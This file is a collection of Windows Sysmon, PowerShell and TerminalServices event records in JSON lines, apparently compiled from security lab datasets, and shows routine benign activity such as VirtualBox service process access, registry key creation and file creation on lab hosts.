{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T01:56:48.017Z", "@timestamp": "2022-08-08T01:56:48.017Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-08 20:56:48.010\r\nSourceProcessGUID: {625b42a0-762f-62f1-1f00-000000000a00}\r\nSourceProcessId: 1188\r\nSourceThreadId: 1404\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {625b42a0-7634-62f1-3b00-000000000a00}\r\nTargetProcessId: 1976\r\nTargetImage: C:\\Windows\\system32\\svchost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\LOCAL SERVICE", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-08 20:56:48.010", "SourceProcessGUID": "{625b42a0-762f-62f1-1f00-000000000a00}", "SourceProcessId": "1188", "SourceThreadId": "1404", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{625b42a0-7634-62f1-3b00-000000000a00}", "TargetProcessId": "1976", "TargetImage": "C:\\Windows\\system32\\svchost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\LOCAL SERVICE"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-03T07:30:35.320Z", "@timestamp": "2022-08-03T07:30:35.320Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-04 02:30:35.311\r\nSourceProcessGUID: {625b42a0-6b36-62e9-1b00-000000000900}\r\nSourceProcessId: 1048\r\nSourceThreadId: 1244\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {625b42a0-2f2e-62eb-8c05-000000000900}\r\nTargetProcessId: 6260\r\nTargetImage: C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.30_none_788560eb0ef1f3b0\\TiWorker.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-04 02:30:35.311", "SourceProcessGUID": "{625b42a0-6b36-62e9-1b00-000000000900}", "SourceProcessId": "1048", "SourceThreadId": "1244", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{625b42a0-2f2e-62eb-8c05-000000000900}", "TargetProcessId": "6260", "TargetImage": "C:\\Windows\\winsxs\\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.18362.30_none_788560eb0ef1f3b0\\TiWorker.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DC01.pandalab.com", "TimeCreated": "2023-07-19T12:20:45.766Z", "@timestamp": "2023-07-19T12:20:45.766Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2023-07-19 19:20:45.713\r\nSourceProcessGUID: {fe86be69-25d2-64b6-2000-000000001000}\r\nSourceProcessId: 1244\r\nSourceThreadId: 1348\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {fe86be69-fbaf-64b5-4200-000000001000}\r\nTargetProcessId: 2348\r\nTargetImage: C:\\Windows\\system32\\dns.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+139d9|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2023-07-19 19:20:45.713", "SourceProcessGUID": "{fe86be69-25d2-64b6-2000-000000001000}", "SourceProcessId": "1244", "SourceThreadId": "1348", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{fe86be69-fbaf-64b5-4200-000000001000}", "TargetProcessId": "2348", "TargetImage": "C:\\Windows\\system32\\dns.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+139d9|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"Keywords": -9223372036854775808, "SeverityValue": 2, "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\Disallowed\\Certificates", "EventTypeOrignal": "INFO", "EventID": 12, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3392, "host": "wec.internal.cloudapp.net", "Channel": "Microsoft-Windows-Sysmon/Operational", "UserID": "S-1-5-18", "AccountType": "User", "ThreadID": 5552, "ProcessGuid": "{d273d0f0-e865-5f64-0c00-000000000800}", "EventReceivedTime": "2020-09-18 13:08:34", "Opcode": "Info", "EventTime": "2020-09-18 13:06:54", "@timestamp": "2020-09-18T17:08:34.972Z", "SourceModuleType": "im_msvistalog", "port": 64545, "AccountName": "SYSTEM", "RecordNumber": 1716313, "Task": 12, "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SourceModuleName": "eventlog", "Severity": "INFO", "SourceName": "Microsoft-Windows-Sysmon", "Version": 2, "Image": "C:\\windows\\system32\\WerFault.exe", "Category": "Registry object added or deleted (rule: RegistryEvent)", "UtcTime": "2020-09-18 17:06:54.530", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"Keywords": -9223372036854775808, "SeverityValue": 2, "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\SecurityManager", "EventTypeOrignal": "INFO", "EventID": 12, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "ExecutionProcessID": 3336, "host": "wec.internal.cloudapp.net", "Channel": "Microsoft-Windows-Sysmon/Operational", "UserID": "S-1-5-18", "AccountType": "User", "ThreadID": 4296, "ProcessGuid": "{d273d0f0-7fae-5f63-1100-000000000400}", "EventReceivedTime": "2020-09-17 17:46:38", "ProcessId": "996", "Opcode": "Info", "EventTime": "2020-09-17 17:46:35", "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2020-09-17 21:46:35.543\r\nProcessGuid: {d273d0f0-7fae-5f63-1100-000000000400}\r\nProcessId: 996\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SecurityManager", "EventType": "CreateKey", "@timestamp": "2020-09-17T21:46:38.331Z", "SourceModuleType": "im_msvistalog", "port": 64545, "AccountName": "SYSTEM", "RecordNumber": 702629, "Task": 12, "Domain": "NT AUTHORITY", "@version": "1", "OpcodeValue": 0, "SourceModuleName": "eventlog", "Severity": "INFO", "SourceName": "Microsoft-Windows-Sysmon", "Version": 2, "Image": "C:\\windows\\system32\\svchost.exe", "Category": "Registry object added or deleted (rule: RegistryEvent)", "UtcTime": "2020-09-17 21:46:35.543", "Hostname": "WORKSTATION6.theshire.local", "RuleName": "-", "tags": ["mordorDataset"]}
{"@timestamp": "2020-10-22T08:29:58.862Z", "ProcessId": "1824", "OpcodeValue": 0, "AccountName": "SYSTEM", "port": 58121, "AccountType": "User", "Severity": "INFO", "EventTime": "2020-10-22 04:29:57", "SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "Channel": "Microsoft-Windows-Sysmon/Operational", "Image": "C:\\windows\\system32\\svchost.exe", "EventReceivedTime": "2020-10-22 04:29:58", "TargetFilename": "C:\\Users\\pgustavo\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat{a79b17b0-1356-11eb-a333-0022481dfc8e}.TM.blf", "ExecutionProcessID": 3184, "UtcTime": "2020-10-22 08:29:57.171", "EventID": 11, "Category": "File created (rule: FileCreate)", "tags": ["mordorDataset"], "SeverityValue": 2, "Keywords": -9223372036854775808, "EventType": "INFO", "Version": 2, "SourceModuleName": "eventlog", "SourceModuleType": "im_msvistalog", "Domain": "NT AUTHORITY", "host": "wec.internal.cloudapp.net", "RuleName": "-", "RecordNumber": 222769, "ThreadID": 4108, "Task": 11, "Message": "File created:\r\nRuleName: -\r\nUtcTime: 2020-10-22 08:29:57.171\r\nProcessGuid: {f3f7ca49-ba4c-5f8f-2900-000000000400}\r\nProcessId: 1824\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetFilename: C:\\Users\\pgustavo\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat{a79b17b0-1356-11eb-a333-0022481dfc8e}.TM.blf\r\nCreationUtcTime: 2020-10-22 08:29:57.171", "Hostname": "WORKSTATION6.theshire.local", "CreationUtcTime": "2020-10-22 08:29:57.171", "@version": "1", "UserID": "S-1-5-18", "ProcessGuid": "{f3f7ca49-ba4c-5f8f-2900-000000000400}", "Opcode": "Info"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T12:50:13.919Z", "@timestamp": "2022-08-08T12:50:13.919Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2022-08-08 19:50:13.909\r\nSourceProcessGUID: {625b42a0-67af-62f1-2100-000000000b00}\r\nSourceProcessId: 1284\r\nSourceThreadId: 1336\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {625b42a0-67ad-62f1-1200-000000000b00}\r\nTargetProcessId: 864\r\nTargetImage: C:\\Windows\\system32\\svchost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2022-08-08 19:50:13.909", "SourceProcessGUID": "{625b42a0-67af-62f1-2100-000000000b00}", "SourceProcessId": "1284", "SourceThreadId": "1336", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{625b42a0-67ad-62f1-1200-000000000b00}", "TargetProcessId": "864", "TargetImage": "C:\\Windows\\system32\\svchost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c524|C:\\Windows\\System32\\KERNELBASE.dll+2730e|C:\\Windows\\System32\\VBoxService.exe+13357|C:\\Windows\\System32\\VBoxService.exe+145d4|C:\\Windows\\System32\\VBoxService.exe+1487e|C:\\Windows\\System32\\VBoxService.exe+102bb|C:\\Windows\\System32\\VBoxService.exe+10dc0|C:\\Windows\\System32\\VBoxService.exe+17ee|C:\\Windows\\System32\\VBoxService.exe+3234f|C:\\Windows\\System32\\VBoxService.exe+35f1c|C:\\Windows\\System32\\VBoxService.exe+103663|C:\\Windows\\System32\\VBoxService.exe+1036f7|C:\\Windows\\System32\\KERNEL32.DLL+17944|C:\\Windows\\SYSTEM32\\ntdll.dll+6ce71", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"RecordNumber":64,"EventRecordId":64,"TimeCreated":"2019-01-19 11:34:08.7968896","EventId":1155,"Level":"Info","Provider":"Microsoft-Windows-TerminalServices-RemoteConnectionManager","Channel":"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational","ProcessId":1260,"ThreadId":1280,"Computer":"IEWIN7","ChunkNumber":0,"UserId":"S-1-5-20","MapDescription":NaN,"UserName":NaN,"RemoteHost":NaN,"PayloadData1":NaN,"PayloadData2":NaN,"PayloadData3":NaN,"PayloadData4":NaN,"PayloadData5":NaN,"PayloadData6":NaN,"ExecutableInfo":NaN,"HiddenRecord":false,"SourceFile":"C:\\Users\\AHMED\\Desktop\\new-approch\\EVTX-ATTACK-SAMPLES\\Command and Control\\DE_RDP_Tunneling_TerminalServices-RemoteConnectionManagerOperational_1149.evtx","Keywords":"0x1000000000000000","ExtraDataOffset":0,"Payload":"{\"EventData\":\"\"}"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DC01.pandalab.com", "TimeCreated": "2023-07-19T05:34:03.868Z", "@timestamp": "2023-07-19T05:34:03.868Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2023-07-20 00:34:03.867\r\nProcessGuid: {fe86be69-80d8-64b8-e104-000000001000}\r\nProcessId: 5804\r\nImage: C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\r\nTargetObject: HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\EdgeUpdate\\ClientState\\{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}\\CurrentState\r\nUser: NT AUTHORITY\\SYSTEM", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2023-07-20 00:34:03.867", "ProcessGuid": "{fe86be69-80d8-64b8-e104-000000001000}", "ProcessId": "5804", "Image": "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe", "TargetObject": "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\EdgeUpdate\\ClientState\\{56EB18F8-B008-4CBD-B6D2-8C97FE7E9062}\\CurrentState", "User": "NT AUTHORITY\\SYSTEM"}
{"SourceName": "Microsoft-Windows-PowerShell", "ProviderGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "Level": "5", "Keywords": "0x0", "Channel": "Microsoft-Windows-PowerShell/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-03T04:19:05.292Z", "@timestamp": "2022-08-03T04:19:05.292Z", "EventID": 4105, "Message": "Started invocation of ScriptBlock ID: c06acfc9-a05b-4149-ab10-c6644af714e6\r\nRunspace ID: 2df6de6d-4ed6-4209-b598-917823190d34", "Task": "102", "ScriptBlockId": "c06acfc9-a05b-4149-ab10-c6644af714e6", "RunspaceId": "2df6de6d-4ed6-4209-b598-917823190d34"}
{"Task": 13, "EventReceivedTime": "2020-07-22 00:03:48", "port": 55069, "SeverityValue": 2, "RuleName": "-", "Keywords": -9223372036854775808, "ProviderGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}", "@version": "1", "SourceModuleType": "im_msvistalog", "Version": 2, "tags": ["mordorDataset"], "Domain": "NT AUTHORITY", "ProcessGuid": "{b59756a9-996d-5f14-4900-000000000400}", "SourceName": "Microsoft-Windows-Sysmon", "ProcessId": "3372", "UserID": "S-1-5-18", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceModuleName": "eventlog", "TargetObject": "HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime", "Message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-07-22 04:03:46.717\r\nProcessGuid: {b59756a9-996d-5f14-4900-000000000400}\r\nProcessId: 3372\r\nImage: C:\\windows\\system32\\svchost.exe\r\nTargetObject: HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime\r\nDetails: QWORD (0x01d65fdd-0x191432af)", "Image": "C:\\windows\\system32\\svchost.exe", "EventTypeOrignal": "INFO", "UtcTime": "2020-07-22 04:03:46.717", "@timestamp": "2020-07-22T04:03:48.926Z", "Details": "QWORD (0x01d65fdd-0x191432af)", "Hostname": "WORKSTATION5.mordor.local", "host": "wec.internal.cloudapp.net", "AccountType": "User", "AccountName": "SYSTEM", "ExecutionProcessID": 9368, "OpcodeValue": 0, "EventType": "SetValue", "EventTime": "2020-07-22 00:03:46", "Severity": "INFO", "EventID": 13, "ThreadID": 6244, "RecordNumber": 1780680}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro01", "TimeCreated": "2022-08-08T01:39:50.947Z", "@timestamp": "2022-08-08T01:39:50.947Z", "EventID": 12, "Message": "Registry object added or deleted:\r\nRuleName: -\r\nEventType: CreateKey\r\nUtcTime: 2022-08-08 20:39:50.939\r\nProcessGuid: {625b42a0-7465-62f1-1206-000000000900}\r\nProcessId: 3736\r\nImage: C:\\Windows\\system32\\backgroundTaskHost.exe\r\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\Hvsi\r\nUser: PEDRO01\\IT01-Pedro", "Task": "12", "RuleName": "-", "EventType": "CreateKey", "UtcTime": "2022-08-08 20:39:50.939", "ProcessGuid": "{625b42a0-7465-62f1-1206-000000000900}", "ProcessId": "3736", "Image": "C:\\Windows\\system32\\backgroundTaskHost.exe", "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Hvsi", "User": "PEDRO01\\IT01-Pedro"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DC01.pandalab.com", "TimeCreated": "2023-07-19T05:34:16.975Z", "@timestamp": "2023-07-19T05:34:16.975Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2023-07-20 00:34:16.955\r\nSourceProcessGUID: {fe86be69-25d2-64b6-2000-000000001000}\r\nSourceProcessId: 1244\r\nSourceThreadId: 1348\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {fe86be69-fbaf-64b5-4200-000000001000}\r\nTargetProcessId: 2348\r\nTargetImage: C:\\Windows\\system32\\dns.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+139d9|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\SYSTEM", "Task": "10", "RuleName": "-", "UtcTime": "2023-07-20 00:34:16.955", "SourceProcessGUID": "{fe86be69-25d2-64b6-2000-000000001000}", "SourceProcessId": "1244", "SourceThreadId": "1348", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{fe86be69-fbaf-64b5-4200-000000001000}", "TargetProcessId": "2348", "TargetImage": "C:\\Windows\\system32\\dns.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+139d9|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\SYSTEM"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DESKTOP-CQF82L6", "TimeCreated": "2022-07-05T02:01:16.148Z", "@timestamp": "2022-07-05T02:01:16.148Z", "EventID": 13, "Message": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2022-07-05 21:01:16.137\r\nProcessGuid: {01e2a015-d098-62bd-0d00-000000000700}\r\nProcessId: 724\r\nImage: C:\\Windows\\system32\\svchost.exe\r\nTargetObject: \\REGISTRY\\A\\{99e38443-e075-4da3-8af7-652ad34182f3}\\WorkItems\\{4bebe4c7-6fee-4c83-a2ae-3ee9640e05ff}\\PackageRelativeAppName\r\nDetails: App\r\nUser: NT AUTHORITY\\SYSTEM", "Task": "13", "RuleName": "-", "EventType": "SetValue", "UtcTime": "2022-07-05 21:01:16.137", "ProcessGuid": "{01e2a015-d098-62bd-0d00-000000000700}", "ProcessId": "724", "Image": "C:\\Windows\\system32\\svchost.exe", "TargetObject": "\\REGISTRY\\A\\{99e38443-e075-4da3-8af7-652ad34182f3}\\WorkItems\\{4bebe4c7-6fee-4c83-a2ae-3ee9640e05ff}\\PackageRelativeAppName", "Details": "App", "User": "NT AUTHORITY\\SYSTEM"}
{"SourceName": "Microsoft-Windows-Sysmon", "ProviderGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "Level": "4", "Keywords": "0x8000000000000000", "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "DC01.pandalab.com", "TimeCreated": "2023-07-19T12:22:27.250Z", "@timestamp": "2023-07-19T12:22:27.250Z", "EventID": 10, "Message": "Process accessed:\r\nRuleName: -\r\nUtcTime: 2023-07-19 19:22:27.245\r\nSourceProcessGUID: {fe86be69-25d2-64b6-2000-000000001000}\r\nSourceProcessId: 1244\r\nSourceThreadId: 1348\r\nSourceImage: C:\\Windows\\System32\\VBoxService.exe\r\nTargetProcessGUID: {fe86be69-fba5-64b5-2700-000000001000}\r\nTargetProcessId: 1568\r\nTargetImage: C:\\Windows\\system32\\svchost.exe\r\nGrantedAccess: 0x1400\r\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+13a2f|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db\r\nSourceUser: NT AUTHORITY\\SYSTEM\r\nTargetUser: NT AUTHORITY\\LOCAL SERVICE", "Task": "10", "RuleName": "-", "UtcTime": "2023-07-19 19:22:27.245", "SourceProcessGUID": "{fe86be69-25d2-64b6-2000-000000001000}", "SourceProcessId": "1244", "SourceThreadId": "1348", "SourceImage": "C:\\Windows\\System32\\VBoxService.exe", "TargetProcessGUID": "{fe86be69-fba5-64b5-2700-000000001000}", "TargetProcessId": "1568", "TargetImage": "C:\\Windows\\system32\\svchost.exe", "GrantedAccess": "0x1400", "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9f934|C:\\Windows\\System32\\KERNELBASE.dll+44a5e|C:\\Windows\\System32\\VBoxService.exe+13bad|C:\\Windows\\System32\\VBoxService.exe+13a2f|C:\\Windows\\System32\\VBoxService.exe+14d25|C:\\Windows\\System32\\VBoxService.exe+103d0|C:\\Windows\\System32\\VBoxService.exe+1bc5|C:\\Windows\\System32\\VBoxService.exe+1b2bb|C:\\Windows\\System32\\VBoxService.exe+200f5|C:\\Windows\\System32\\KERNEL32.DLL+14de0|C:\\Windows\\SYSTEM32\\ntdll.dll+7e3db", "SourceUser": "NT AUTHORITY\\SYSTEM", "TargetUser": "NT AUTHORITY\\LOCAL SERVICE"}
